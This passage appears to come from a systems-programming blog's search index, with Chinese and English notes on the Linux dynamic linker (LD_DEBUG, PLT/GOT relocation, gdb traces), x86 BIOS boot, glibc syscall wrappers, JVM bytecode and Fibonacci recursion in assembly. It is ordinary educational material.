/lib/x86_64-linux-gnu/libc.so.6 (0x00007be167000000) /lib64/ld-linux-x86-64.so.2 (0x00007be1672c1000) gdb initialize 处打断点 (gdb) bt #0 initialize () at demo.c:27 #1 0x00007ffff7c2a304 in call_init (env=\u003coptimized out\u003e, argv=0x7fffffffdc48, argc=1) at ../csu/libc-start.c:145 #2 __libc_start_main_impl (main=0x5555555551ed \u003cmain\u003e, argc=1, argv=0x7fffffffdc48, init=\u003coptimized out\u003e, fini=\u003coptimized out\u003e, rtld_fini=\u003coptimized out\u003e, stack_end=0x7fffffffdc38) at ../csu/libc-start.c:347 #3 0x00005555555550a5 in _start () (gdb) info proc mappings process 50955 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/yang/elf-demo/demo 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/yang/elf-demo/demo 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/yang/elf-demo/demo 0x555555557000 0x555555558000 0x1000 0x2000 r--p /home/yang/elf-demo/demo 0x555555558000 0x555555559000 0x1000 0x3000 rw-p /home/yang/elf-demo/demo 0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0 r--p /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7c28000 0x7ffff7db0000 0x188000 0x28000 r-xp /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7db0000 0x7ffff7dff000 0x4f000 0x1b0000 r--p /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7dff000 0x7ffff7e03000 0x4000 0x1fe000 r--p /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7e03000 0x7ffff7e05000 0x2000 0x202000 rw-p /usr/lib/x86_64-linux-gnu/libc.so.6 /usr/lib/x86_64-linux-gnu/libc.so.6 这就是由 /lib64/ld-linux-x86-64.so.2 装载的依赖的动态库 Step 3: Lazy Binding Lazy binding means that the actual address of printf isn’t resolved until the first time it’s called.\nfunction call → PLT → GOT → resolver → dynamic linker resolves symbol → GOT updated → future calls jump directly to the resolved address. This is lazy binding. When a function like printf is called for the first time: The PLT entry jumps to the GOT. The GOT initially points to resolver code in the dynamic linker. The resolver resolves the symbol (e.g., finds printf in libc) and updates the GOT. Subsequent calls jump directly to the resolved address. dynamic linker 启用环境变量观察过程 LD_DEBUG 环境变量 LD_DEBUG=help ./demo Valid options for the LD_DEBUG environment variable are: libs display library search paths reloc display relocation processing files display progress for input file symbols display symbol table processing bindings display information about symbol binding versions display version dependencies scopes display scope information all all previous options combined statistics display relocation statistics unused determined unused DSOs help display this help message and exit To direct the debugging output into a file instead of standard output a filename can be specified using the LD_DEBUG_OUTPUT environment variable. LD_DEBUG=libs ./demo 分析 The LD_DEBUG=libs output provides a detailed view of how the dynamic linker (ld.so) loads and initializes shared libraries for your demo executable.\n1. Library Search and Loading 4039: find library=libc.so.6 [0]; searching 4039: search cache=/etc/ld.so.cache 4039: trying file=/lib/x86_64-linux-gnu/libc.so.6 Purpose: The dynamic linker searches for required shared libraries (libc.so.6 in this case). Process: It first checks the precomputed cache file /etc/ld.so.cache for efficiency. Then it directly tries the filesystem path /lib/x86_64-linux-gnu/libc.so.6. Result: libc.so.6 (the standard C library) is loaded into memory. 2. Initialization of Libraries 4039: calling init: /lib64/ld-linux-x86-64.so.2 4039: calling init: /lib/x86_64-linux-gnu/libc.so.6 Purpose: Run initialization code for shared libraries. Order: Dynamic Linker (ld-linux-x86-64.so.2): Initializes internal structures (e.g., GOT/PLT setup). libc.so.6: Initializes the C library (e.g., stdio, threading, heap). 3. Program Initialization 4039: initialize program: ./demo Purpose: Execute constructor functions (marked with __attribute__((constructor))) before main(). In Your Code: The initialize() function is called here, printing \"Initializing...\\n\". 4. Transfer Control to Program 4039: transferring control: ./demo Purpose: Jump to the program’s main() function. Output: Global Data: 42 (from global_data in .data) Global BSS: 0 (from global_bss in .bss, zero-initialized) Local Static: 100 (from local_static in .data) Hello from .rodata! (from message in .rodata) Counter: 1, Counter: 2, Counter: 3 (from counter() with static count in .bss) 5. Finalization 4039: calling fini: [0] 4039: Finalizing... 4039: calling fini: /lib/x86_64-linux-gnu/libc.so.6 4039: calling fini: /lib64/ld-linux-x86-64.so.2 Purpose: Run destructor functions (marked with __attribute__((destructor))) after main(). Order: Program Destructors: The finalize() function is called, printing \"Finalizing...\\n\". Library Destructors: libc.so.6: Cleans up C library resources. ld-linux-x86-64.so.2: Cleans up dynamic linking infrastructure. Key Observations Initialization Order:\nLibraries are initialized depth-first, starting from dependencies (e.g., libc) and moving to the main executable. Constructors run after all libraries are loaded but before main(). Finalization Order:\nDestructors run in reverse order of initialization: Program destructors first (finalize()), then library destructors (libc, ld-linux). Dynamic Linker Role:\nManages the entire lifecycle: Loading: Resolves symbols and maps libraries into memory. Relocation: Adjusts addresses for position-independent code (PIC). Initialization/Finalization: Ensures proper setup/teardown of libraries and code. Symbol Resolution:\nSymbols like printf are resolved via .plt/.got (lazy binding unless BIND_NOW is set). Why This Matters Debugging: Helps identify missing libraries, symbol conflicts, or initialization issues. Performance: Reveals overhead from lazy vs. eager binding (LD_BIND_NOW). Security: Shows how libraries are loaded and validated (e.g., PIE, RELRO). LD_DEBUG=files ./demo 分析 LD_DEBUG=files ./demo 4266: 4266: file=libc.so.6 [0]; needed by ./demo [0] 4266: file=libc.so.6 [0]; generating link map 4266: dynamic: 0x000073f09de02940 base: 0x000073f09dc00000 size: 0x0000000000211d90 4266: entry: 0x000073f09dc2a390 phdr: 0x000073f09dc00040 phnum: 14 4266: 4266: 4266: calling init: /lib64/ld-linux-x86-64.so.2 4266: 4266: 4266: calling init: /lib/x86_64-linux-gnu/libc.so.6 4266: 4266: 4266: initialize program: ./demo 4266: Initializing... 4266: 4266: transferring control: ./demo 4266: Global Data: 42 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 4266: 4266: calling fini: [0] 4266: Finalizing... 4266: 4266: calling fini: /lib/x86_64-linux-gnu/libc.so.6 [0] 4266: 4266: 4266: calling fini: /lib64/ld-linux-x86-64.so.2 [0] 4266: Library File Resolution 4266: file=libc.so.6 [0]; needed by ./demo [0] 4266: file=libc.so.6 [0]; generating link map Purpose: The dynamic linker resolves dependencies listed in the .dynamic section (e.g., NEEDED entries like libc.so.6). Link Map: A link_map structure is created to track metadata for each loaded library. Fields: dynamic: Pointer to the .dynamic section of libc.so.6 (used for symbol resolution). base: Load address in memory (0x000073f09dc00000). size: Size of the mapped library (0x211d90 bytes). entry: Entry point (start address of libc.so.6). phdr: Pointer to program headers (used to load segments into memory). phnum: Number of program headers (14 in this case). LD_DEBUG=reloc ./demo 分析 The LD_DEBUG=reloc ./demo output reveals how the dynamic linker processes relocations during program execution. Relocations are adjustments made to addresses in the binary and shared libraries when they’re loaded into memory (due to Position-Independent Code (PIC) and Address Space Layout Randomization (ASLR)). Let’s break down the key steps:\n1. Relocation Processing 5881: relocation processing: /lib/x86_64-linux-gnu/libc.so.6 5881: relocation processing: ./demo 5881: relocation processing: /lib64/ld-linux-x86-64.so.2 Purpose: The dynamic linker resolves symbol addresses in the following order:\nlibc.so.6: Adjusts addresses for symbols like printf, exit, and global variables. ./demo: Fixes up addresses for global/static variables (e.g., global_data, global_bss, local_static) and PLT/GOT entries. ld-linux-x86-64.so.2: Adjusts internal addresses for the dynamic linker itself. What Happens During Relocation?\nThe dynamic linker reads relocation sections like .rela.dyn (for global variables) and .rela.plt (for function calls) to update addresses. For example: A R_X86_64_GLOB_DAT relocation updates the GOT entry for printf to point to its address in libc.so.6. A R_X86_64_RELATIVE relocation adjusts addresses in ./demo based on its load address (ASLR). 2. Initialization of Libraries 5881: calling init: /lib64/ld-linux-x86-64.so.2 5881: calling init: /lib/x86_64-linux-gnu/libc.so.6 Purpose: Run initialization code for shared libraries after relocations are applied. Order: Dynamic Linker (ld-linux): Initializes internal structures (e.g., GOT/PLT setup). libc.so.6: Initializes the C library (e.g., stdio, heap). 3. Program Initialization 5881: initialize program: ./demo Initializing... Purpose: Execute constructor functions (marked with __attribute__((constructor))) before main(). In Your Code: The initialize() function is called here, printing \"Initializing...\\n\". 4. Transfer Control to Program 5881: transferring control: ./demo Purpose: Jump to the program’s main() function.\nOutput:\nGlobal Data: 42 (from global_data in .data) Global BSS: 0 (from global_bss in .bss, zero-initialized) Local Static: 100 (from local_static in .data) Hello from .rodata! (from message in .rodata) Counter: 1, Counter: 2, Counter: 3 (from counter() with static count in .bss) Relocation Details:\nStatic Variables: Addresses of global_data, global_bss, and local_static are resolved via .rela.dyn relocations. Function Calls: printf is resolved via .rela.plt relocations using the PLT/GOT mechanism. 5. Finalization 5881: calling fini: [0] Finalizing... 5881: calling fini: /lib/x86_64-linux-gnu/libc.so.6 5881: calling fini: /lib64/ld-linux-x86-64.so.2 Purpose: Run destructor functions (marked with __attribute__((destructor))) after main(). Order: Program Destructors: The finalize() function is called, printing \"Finalizing...\\n\". Library Destructors: libc.so.6: Cleans up C library resources. ld-linux-x86-64.so.2: Cleans up dynamic linking infrastructure. Key Concepts in Relocation Why Relocation Is Needed:\nShared libraries are compiled as position-independent code (PIC) to support ASLR. At runtime, the dynamic linker adjusts addresses to match the actual load address in memory. Types of Relocations:\nR_X86_64_RELATIVE: Adjusts addresses relative to the library’s base address (e.g., for ./demo). R_X86_64_GLOB_DAT: Updates GOT entries for global symbols (e.g., printf in libc.so.6). R_X86_64_JUMP_SLOT: Updates PLT entries for lazy binding (e.g., resolving printf on first call). Sections Involved:\n.rela.dyn: Relocations for global variables and data. .rela.plt: Relocations for function calls (lazy binding). .got: Global Offset Table (stores resolved addresses for variables/functions). .plt: Procedure Linkage Table (trampolines for lazy symbol resolution). Example: Resolving printf Initial Call:\nprintf in main() jumps to .plt, which then jumps to .got. If unresolved, .got redirects to the dynamic linker. Dynamic Linker:\nUses .rela.plt to find the symbol index for printf. Looks up printf in libc.so.6 using .gnu.hash and .dynsym. Updates the .got entry with printf’s runtime address. Subsequent Calls:\nDirectly use the resolved address in .got (no dynamic linker needed). Summary Relocation ensures that addresses in the binary and shared libraries are adjusted at runtime to work with ASLR and PIC. Dynamic linker processes relocations in .rela.dyn (variables) and .rela.plt (functions) to resolve symbols like printf. Constructors/destructors (initialize/finalize) are handled via .init_array/.fini_array after relocations are applied. printf 重定位分析 gcc -g -no-pie -o demo demo.c 查看重定位信息 readelf -r demo Relocation section '.rela.dyn' at offset 0x4d8 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000403fd8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0 000000403fe0 000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 Relocation section '.rela.plt' at offset 0x508 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000404000 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000404008 000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 0x000000404008 就是 printf 在文件中偏移量\ngdb ./demo 分析 Reading symbols from ./demo... (gdb) break _start Breakpoint 1 at 0x401070 (gdb) break break break-range (gdb) run Starting program: /home/yang/elf-demo/demo Breakpoint 1.2, 0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2 (gdb) break _dl_runtime_resolve_xsave _dl_runtime_resolve_xsave _dl_runtime_resolve_xsavec (gdb) break _dl_runtime_resolve_xsave Breakpoint 2 at 0x7ffff7fda220: file ../sysdeps/x86_64/dl-trampoline.h, line 71. (gdb) info sharedlibrary From To Syms Read Shared Object Library 0x00007ffff7fc6000 0x00007ffff7ff0195 Yes /lib64/ld-linux-x86-64.so.2 (gdb) dis disable disassemble disconnect display (gdb) disassemble printf Dump of assembler code for function printf@plt: 0x0000000000401060 \u003c+0\u003e:\tendbr64 0x0000000000401064 \u003c+4\u003e:\tjmp *0x2f9e(%rip) # 0x404008 \u003cprintf@got.plt\u003e 0x000000000040106a \u003c+10\u003e:\tnopw 0x0(%rax,%rax,1) End of assembler dump. (gdb) x/xg 0x404008 0x404008 \u003cprintf@got.plt\u003e:\t0x0000000000401040 # 重定位前的地址 (gdb) info stack #0 0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2 #1 0x0000000000000001 in ?? () #2 0x00007fffffffe1a9 in ?? () #3 0x0000000000000000 in ?? () (gdb) break print_message Breakpoint 3 at 0x4011c8: file demo.c, line 32. (gdb) continue Continuing. [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Breakpoint 1.1, 0x0000000000401070 in _start () (gdb) continue Continuing. Initializing... Global Data: 42 Global BSS: 0 Local Static: 100 Breakpoint 3, print_message () at demo.c:32 32\tprintf(\"%s\\n\", message); // Uses PLT/GOT for printf (gdb) x/xg 0x404008 0x404008 \u003cprintf@got.plt\u003e:\t0x00007ffff7c600f0 # 重定位后的地址 (gdb) info stack #0 print_message () at demo.c:32 #1 0x0000000000401244 in main () at demo.c:43 (gdb) break counter Breakpoint 4 at 0x40115e: file demo.c, line 16. (gdb) continue Continuing. Hello from .rodata! Breakpoint 4, counter () at demo.c:16 16\tcount++; (gdb) info stack #0 counter () at demo.c:16 #1 0x0000000000401257 in main () at demo.c:46 (gdb) x/xg 0x404008 0x404008 \u003cprintf@got.plt\u003e:\t0x00007ffff7c600f0 dynamic linker 总结 The dynamic linker (ld-linux-*.so) is a shared object that the kernel loads directly. It bootstraps the loading of all other shared libraries and manages symbol resolution. Without it, dynamically linked programs (like most C programs using glibc) would not work. ","dynamic-linker-简介#\u003cstrong\u003edynamic linker\u003c/strong\u003e 简介":"","how-dynamic-linker-works#\u003cstrong\u003eHow Dynamic Linker Works?\u003c/strong\u003e":"","ld_#\u003cstrong\u003eLD_DEBUG=reloc ./demo 分析\u003c/strong\u003e":"","ld_debugfiles-demo-分析#LD_DEBUG=files ./demo 分析":"","ld_debuglibs-demo-分析#\u003ccode\u003eLD_DEBUG=libs ./demo 分析\u003c/code\u003e":"","printf-重定位分析#\u003ccode\u003eprintf\u003c/code\u003e 重定位分析":"","reference#Reference":" dynamic-linker 彻底理解连接器系列 ","what-is-the-dynamic-linker#\u003cstrong\u003eWhat Is the Dynamic Linker?\u003c/strong\u003e":""},"title":"Asm Dynamic Linker"},"/blog/asm-how-computer-startup/":{"data":{"":"x86 架构计算机是如何启动的？","16-bit-processors-and-segmentation-1978#16-bit Processors and Segmentation (1978)":" The IA-32 architecture family was preceded by 16-bit processors, the 8086 and 8088. The 8086 has 16-bit registers and a 16-bit external data bus, with 20-bit addressing giving a 1-MByte address space. The 8088 is similar to the 8086 except it has an 8-bit external data bus. The 8086/8088 introduced segmentation to the IA-32 architecture. With segmentation, a 16-bit segment register contains a pointer to a memory segment of up to 64 KBytes. Using four segment registers at a time, 8086/8088 processors are able to address up to 256 KBytes without switching between segments. The 20-bit addresses that can be formed using a segment register and an additional 16-bit pointer provide a total address range of 1 MByte.\n8086 是整个 intel 系列处理器的老祖宗。所有后续的一系列处理器都兼容 8086。唉，这就是路径依赖啊。这是一个 16-bit 的处理器。寄存器也是 16-bit 的。but 却能寻址 20-bit 的地址空间，也就是 1M 的内存。怎样在 16-bit 的处理器上实现呢？很简单，将 1M 的空间分成多个 64K 的 segment。那怎样用 16-bit 的寄存器表示 20-bit 的地址呢？也很简单，用 2 个 16-bit 的寄存器组合得来的(register1,register2)。那怎样组合的呢？address = register1 \u003c\u003c 4 + register2。将 register1 « 4 和 register2 用一个 20-bit 的加法器就能得到内存地址。这种方式就是所谓的 real address mode。也即是拿到的是真正的内存地址。x86 架构的计算机启动时会先进入 real address mode。","bios#BIOS":"BIOS 是啥 BIOS 是啥呢？一个软件而已。不像我们平时在 PC 上使用如 QQ 等软件是安装在硬盘上的。BIOS 安装在 ROM 中。这个软件干啥的呢？帮助计算机启动，开机时检测整个机器的硬件。计算机启动需要运行软件，软件运行需要计算机先启动。咳咳，成了先有鸡还是先有蛋了，这怎么行？所以需要 BIOS 这个在硬件上的软件来帮助，破除这种依赖。\nBIOS 大小 通过 dmidecode 这个命令来查看。也就是读取 BIOS 的信息。\nroot@aliyun:~# dmidecode -t bios -q # 方法一 BIOS Information Vendor: SeaBIOS Version: 8c24b4c Release Date: 04/01/2014 Address: 0xE8000 Runtime Size: 96 kB ROM Size: 64 kB --- ROM Size，在此可以看到，BIOS 大小为 64K。 Characteristics: BIOS characteristics not supported Targeted content distribution is supported BIOS Revision: 0.0 root@aliyun:~# cd /sys/class/dmi/id/ # 方法二 root@aliyun:id# ls bios_date chassis_serial modalias product_serial sys_vendor bios_vendor chassis_type power product_uuid uevent bios_version chassis_vendor product_family product_version chassis_asset_tag chassis_version product_name subsystem ","references#References":"1.x86-ORG 2. how-to-see-rom-size 3. bios-info-dmidecode 4. system-management-bios 5. 计算机是如何启动的？ 6. 多种 MBR 组织方式 7. 计算机是怎样启动的？","x86-架构计算机启动流程#x86 架构计算机启动流程":" #(real address mode 1M 内存布局)\n如上图所示，当按下 power on 之后，此时的 CPU 处于 real address mode。由硬件负责将 BIOS 64K 的内容加载到 0xF0000 到 0xFFFFF(64K 内存)。并将 CS(code segment) 置为 0xF000，IP(instruction pointer) 置为 0xFFF0。组合起来的内存地址 PC 就是 0xFFFF0。\n此时 CPU 从 PC = 0xFFFF0 处开始取指、执行。那么从 0xFFFF0 到 0xFFFFF 只有 16Bytes。空间太小了，能放啥呢？但是可以跳到其他地方去执行啊。不错，这里存放的有一条指令是 jmp far f000:e05b, 组合起来就是 0xfe05b。注意这个地址可是在 0xF0000 到 0xFFFFF 范围之内，也就是这条指令跳转到 BIOS 内部的代码去执行。从 0xFE05B 到 0xFFFF0 将近 8K 内存，代码不少。\n此时 CPU 从 PC = 0xfe05b 开始取值、执行。具体干啥呢？就是执行所谓的开机自检。检查计算机硬件。同时去找启动扇区，那什么才是启动扇区呢？若 0 盘 0 道 1 扇区最后两个字节分别是 0x55,0xaa，那就是启动区。很像 java class 文件中的魔数，就是标记一下。同时将找到的启动扇区(512Bytes) 复制到内存 0x7C00 到 0x7DFF(512Bytes) 处。最后会将 CS 置为 0x0000， IP 置为 0x7C00，组合起来就是 0x7C00。\n此时 CPU 从 PC = 0x7C00 开始取值、执行。具体干啥呢？这就是开发人员可以决定的了。在启动扇区上可以是加载 OS Kernel 的代码，硬盘分区，boot loader 等。","计算机启动前置知识#计算机启动前置知识":" CPU 工作方式是: 从内存中取指、执行。 内存是存储数据的地方，给出一个内存地址，可以得到该处的数据。 CPU 从内存哪里取指令，由 instruction pointer 这个寄存器的值决定。这个值不断 +1，或者跳转(jump) 到某处。real address mode 下由 CS:IP 组合决定。 "},"title":"asm-how-computer-startup"},"/blog/asm-how-glibc-wrap-syscall/":{"data":{"argument-setup#Argument Setup​​":"","how-glibc-wraps-system-calls#How glibc Wraps System Calls​​":"","kernel-transition#​Kernel Transition​​":" 实验平台: x86_64 GNU/Linux mint22.1\n使用 glibc 的函数write1.c\n#include \u003cunistd.h\u003e int main() { const char msg[] = \"Hello, glibc!\\n\"; write(1, msg, sizeof(msg) - 1); // glibc's write() wrapper return 0; } gcc -o write1 write1.c 使用 ltrace ./write1 查看调用了 write 库函数 不使用 glibc 的函数write2.c\n#include \u003cerrno.h\u003e #include \u003csyscall.h\u003e #include \u003cunistd.h\u003e ssize_t write_no_glibc(int fd, const void *buf, size_t count) { long ret; asm volatile( \"syscall\" : \"=a\"(ret) // Output: result in rax : \"a\"(__NR_write), \"D\"(fd), \"S\"(buf), \"d\"(count) // Inputs : \"rcx\", \"r11\", \"memory\" // Clobbered registers ); if (ret \u003c 0) { errno = -ret; // Set errno on error return -1; } return ret; // Return bytes written } int main() { const char msg[] = \"Hello, glibc!\\n\"; write_no_glibc(1, msg, sizeof(msg) - 1); return 0; } gcc -o write2 write2.c 使用 ltrace ./write2 查看没有调用 write 库函数 How glibc Wraps System Calls​​​System Call Number​​ Each system call (e.g., write, read) is assigned a unique number (e.g., __NR_write). 要使用哪一个 syscall\nArgument Setup​​ The wrapper loads the system call number and arguments into specific registers (architecture-dependent). 设置 syscall 的参数\n​Kernel Transition​​ The wrapper uses an instruction like syscall (x86-64) to switch to kernel mode. 进入 kernel mode","references#References":" https://man7.org/linux/man-pages/man1/ltrace.1.html ","result-handling#Result Handling​​":"After the kernel finishes, the wrapper checks for errors, sets errno if needed, and returns the result. 处理返回值","system-call-number#​System Call Number​​":"","不使用-glibc-的函数#不使用 glibc 的函数":"","使用-glibc-的函数#使用 \u003ccode\u003eglibc\u003c/code\u003e 的函数":""},"title":"Asm How Glibc Wrap Syscall"},"/blog/asm-how-java-byte-code-execute/":{"data":{"jclasslib-查看字节码#jclasslib 查看字节码":"","jvm#jvm":"jvm jvm 是一个栈式(stack-based)虚拟计算机。啥意思，就是大多数的 opcode 的操作数在 operand stack 上，执行的结果也放在 oprand stack 上。\n有的 opcode 的操作数在 local variable table，如 iinc。","references#References":" postfix-expression jclasslib jvms-6.5.iconst_i jvms-6.5.invokestatic jvms-6.5.getstatic ","分析的代码#分析的代码":" package stardustman.github.io; public class BoxingUnboxingExample { public static void main(String[] args) { Integer sum = 0; for (int i = 1; i \u003c= 1000000; i++) { sum += i; // Auto-boxing of primitive type int to Integer } System.out.println(\"The sum is: \" + sum); } } ","字节码执行过程#字节码执行过程":""},"title":"Asm How Java Byte Code Execute"},"/blog/asm-how-recursion-function-execute/":{"data":{"asm-代码#Asm 代码":"中间代码 fib(long): pushq %rbp movq %rsp, %rbp pushq %rbx subq $24, %rsp movq %rdi, -24(%rbp) // n cmpq $2, -24(%rbp) // n - 2 jg .L2 movl $1, %eax // n \u003c= 2 jmp .L3 .L2: movq -24(%rbp), %rax // n subq $1, %rax // n - 1 movq %rax, %rdi call fib(long) movq %rax, %rbx // movq -24(%rbp), %rax // n subq $2, %rax // n - 2 movq %rax, %rdi call fib(long) addq %rbx, %rax .L3: addq $24, %rsp // 释放分配的栈空间 popq %rbx popq %rbp ret main: pushq %rbp movq %rsp, %rbp subq $16, %rsp movl $3, %edi // n = 3 call fib(long) movq %rax, -8(%rbp) // result = fib(3) movl $0, %eax leave ret 反编译可执行代码 fib(long): push %rbp mov %rsp,%rbp push %rbx sub $0x18,%rsp mov %rdi,-0x18(%rbp) cmpq $0x2,-0x18(%rbp) jg 4004cd \u003cfib(long)+0x1b\u003e // 0x1b 是地址为 4004cd 这条指令之前的所有指令的字节数 mov $0x1,%eax jmp 4004f3 \u003cfib(long)+0x41\u003e // 0x41 是地址为 4004f3 这条指令之前的所有指令的字节数 mov -0x18(%rbp),%rax sub $0x1,%rax mov %rax,%rdi callq 4004b2 \u003cfib(long)\u003e mov %rax,%rbx mov -0x18(%rbp),%rax sub $0x2,%rax mov %rax,%rdi callq 4004b2 \u003cfib(long)\u003e add %rbx,%rax add $0x18,%rsp pop %rbx pop %rbp retq main: push %rbp mov %rsp,%rbp sub $0x10,%rsp movq $0x0,-0x8(%rbp) mov $0x4,%edi callq 4004b2 \u003cfib(long)\u003e mov %rax,-0x8(%rbp) mov $0x0,%eax leaveq retq nop fib(n)函数里调用 fib(n - 1) 和 fib(n - 2)视为两个和 fib(n) 完全不同的函数, 因为函数返回地址在汇编层面根本不一样. fib(n), fib(n - 1) 和 fib(n - 2) 的处理逻辑不一样, 只是之间有依赖而已. 也可以视为编译器级别的函数重载. 理解成三个不同的函数, 这个递归就很好理解了. ","c-代码#C 代码":" #include \u003cstdio.h\u003e long fib(long n){ if(n \u003c= 2){ return 1; } return fib(n-1) + fib(n-2); } int main(){ long result = 0; result = fib(4); //printf(\"%d\\n\",result); return 0; } ","references#References":" asm-cmpq asm-jg asm-jp-table 斐波那契数列 asm-tool 尾调用(tail-call)之尾递归 动态规划 ","代码分析#代码分析":"","优化递归#优化递归":"空间换时间优化代码 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e # define LENGTH 51 // 计算 fib(50) // 全局的用来保存 fib(n)(n \u003e 2) 计算结果的数组. unsigned long result[LENGTH]; unsigned long fib(long n){ // fib(n) 已经被计算, 那就直接返回. if(result[n] != 0){ return result[n]; } else{ // 保存 fib(n) 的计算结果 result[n] = fib(n-1) + fib(n-2); } return result[n]; } int main(){ clock_t beginTime,endTime; // 由于 1, 1, 2, 3, 5 ..... 都是大于 0 的结果, 全部初始化为 0, 相当于都没有计算结果. for(int i = 0; i \u003c LENGTH ; i++){ result[i] = 0; } // fib(1) 的计算结果为 1 result[1] = 1; // fib(2) 的计算结果为 1 result[2] = 1; beginTime = clock(); fib(LENGTH - 1); endTime = clock(); printf(\"Running Time %f Seconds\\n\",(double)(endTime - beginTime)/CLOCKS_PER_SEC); for(int i = 1; i \u003c LENGTH; i++){ printf(\" %i :: %lu \\n\", i, result[i]); } } 优化递归函数栈帧 fib(5)递归栈帧)\n着色方框-开辟销毁的栈帧 白色方框-不用开辟的栈帧 优化后的 fib(n) 开辟栈帧总数量可以表示为: sum(n) = (n - 2)(n \u003e= 3). 时间复杂度是: O(n) 计算 fib(50) 开辟栈帧总数量是: sum(50) = 48 fib(50) = 3996334433 时间复杂度是 O(50), 结果几乎秒算. unsigned long result[LENGTH]; 拿空间换时间, 其实这句话有问题的, 拿出来空间, 计算逻辑也是要优化的. 尾递归优化 非优化递归 unsigned long fib(unsigned long n){ if(n \u003c= 2){ return 1; } return fib(n-1) + fib(n-2); } 汇编视角下这里 fib(n-1) 和 fib(n-2) 与 fib(n) 其实根本不是同一个函数. 三者的逻辑其实不同, 但是函数之间有依赖. 优化递归 尾递归的实现, 往往需要改写递归函数, 确保最后一步只调用自身. 做到这一点的方法, 就是把所有用到的内部变量改写成函数的参数. 尾调用的概念非常简单, 一句话就能说清楚, 就是指某个函数的最后一步是调用另一个函数. 中间变量改成函数的参数 unsigned long fib(unsigned long n, unsigned long prev, unsigned long sum ){ if(n \u003c= 3){ return sum; } return fib(n-1, sum , prev + sum); // 尾调用 } 这里 fib(n-1, sum , prev + sum) 的才是和 fib(unsigned long n, unsigned long prev, unsigned long sum ) 完全一样的函数.\n包装一层 unsigned long fibonacc(unsigned long n){ if( n \u003c= 2){ return 1; } // 1 : fib(2) // 2 : fib(2) + fib(1) = fib(3) return fib(n, 1, 2); } 计算结果保存在参数里.\nfib(n) 汇编代码分析 #(尾递归汇编代码)\n尾递归的 fib(n-1, sum , prev + sum) 是尾调用, 也就是函数执行完没有其他的操作了, 就直接返回了. 符合 n \u003c= 3 的条件, 汇编直接 jmp 到销毁栈帧的代码. 因为返回值在符合递归退出条件时, 已经被设置到 rax 里了. ","图解#图解":" 假设在n月有兔子总共 a 对, n+1 月总共有 b 对. 在 n+2 月必定总共有 a+b 对: 因为在 n+2 月的时候, 前一月(n+1月) 的 b 对兔子可以存留至第 n+2 月(在当月属于新诞生的兔子尚不能生育). 而新生育出的兔子对数等于所有在 n 月就已存在的 a 对.","斐波那契数列#斐波那契数列":"斐波那契数列","结论#结论":" 用简单的一句话,递归就是调用函数本身. 这句话是相当不负责任的. 递归函数在汇编级别的调用自己, 尽管调用的是自己, 递归的函数名尽管相同, 但是函数返回地址是不相同的. 这也意味着其实逻辑完全可能不一样. 结合栈帧的创建和销毁, 就可以理解 Stack Overflow 这种错误. ","调用栈调用顺序分析#调用栈调用顺序分析":"调用栈图解分析 #(fib(4)调用栈分析)\n符合递归终止时调用栈执行顺序 fib(3) = fib(2) + fib(1), 就符合递归退出的条件.\n代码执行顺序 #(fib(3)-execute-sequence)\n二叉树后序遍历的视角来分析 递归终止条件: fib(2) = 1 视为左叶子节点 fib(1) = 1 视为右叶子节点 fib(3) = fib(2) + fib(1) 视为父节点 #(符合递归退出代码执行流程)\nfib(3) 调用 fib(2), 计算出参数 n = 2. 进入左叶子节点. fib(2) 返回 fib(3), fib(2) 的返回值 rax = 1, 复制给 rbx. fib(3) 调用 fib(1), 计算出参数 n = 1. 进入右叶子节点. fib(1) 返回 fib(3), fib(1) 的返回值 rax = 1 fib(3) 计算 fib(3) = fib(2) + fib(1) = rbx + rax = 1 + 1 = 2 栈帧的创建和销毁-二叉树后序遍历 fib(n) = fib(n-1) + fib(n-2)(n \u003e 2) 递归调用可以看作是栈帧按照二叉树后续遍历(左子树-右子树-根)的顺序动态的创建和销毁. 着色方框为创建的栈帧 白色方框为销毁的栈帧或者还未创建的栈帧 方框由白色变为着色: 栈帧创建 方框由着色变为白色: 栈帧销毁 从图中可以看出假如 main 调用 fib(5), 会一直调用到 f(2) 才会终止. 则调用栈状态如图 0. 此时递归最大的栈深度是 4, 如果 n 值过大, 会很容易发生 Stack Overflow 这种错误. 比方说 fib(1000) 会一直创建到 fib(2) 这个栈帧, 递归才会开始返回. fib(2) 返回 1 给 fib(3), fib(3) 保存这个返回值. f(2) 栈帧销毁. 如图 1. fib(3) 调用 fib(2) 如图 2. fib(2) 返回 1 给 fib(3), fib(3) 将 fib(2)返回值和 fib(1) 的返回值相加. 如图 3. fib(3) 返回 fib(2)返回值和 fib(1) 的返回值相加的结果. 如图 4. 效率低原因分析 计算的结果并没有保存. 每一次进入递归之后都是从基本的 fib(2) 和 fib(1) 向上返回. 中间伴随着大量的栈帧创建和销毁, 以及重复的函数计算.函数栈帧的创建和销毁是耗时的操作, 这可就很慢了. fib(n) 开辟栈帧总数量可以表示为: sum(n) = 2^(n - 2) + 1 (n \u003e= 3). 时间复杂度是: O(2^n) 运行时间测试 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e #define LENGTH 51 unsigned long fib(unsigned long n){ if(n \u003c= 2){ return 1; } return fib(n-1) + fib(n-2); } int main(){ unsigned long long result = 0; clock_t beginTime,endTime; beginTime 